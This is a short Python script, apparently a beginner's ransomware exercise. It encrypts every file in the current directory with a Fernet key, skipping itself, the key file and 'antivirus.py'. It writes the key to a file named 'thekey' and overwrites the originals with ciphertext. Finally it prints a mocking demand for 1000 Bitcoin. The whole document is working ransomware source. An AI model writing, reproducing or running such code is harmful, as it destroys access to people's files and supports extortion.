import os

from cryptography.fernet import Fernet

#define files

files = []

#use  FOR loop to navigate or discover files

for file in os.listdir():
	if file =="ransomeware.py" or file == "thekey" or file == "antivirus.py" : # to not include this file
		continue
	if os.path.isfile(file):
		files.append(file)


key = Fernet.generate_key()

#need to save the key

with open("thekey", "wb") as lock:  #wb is write mode and b is binary . Its nothing to confused about
	lock.write(key)


#now for the encryption

for file in files:
	with open(file, "rb") as destroy:          # r is read mode and b is binary
		content = destroy.read()
	content_encrypted = Fernet(key).encrypt(content)
	with open(file, "wb") as destroy:
		destroy.write(content_encrypted)

print("Your Files has benn encrypted !! Send 1000 Bit coin if you want your Data back . HAHAHAHA") #just some threating message here!!
print(files)
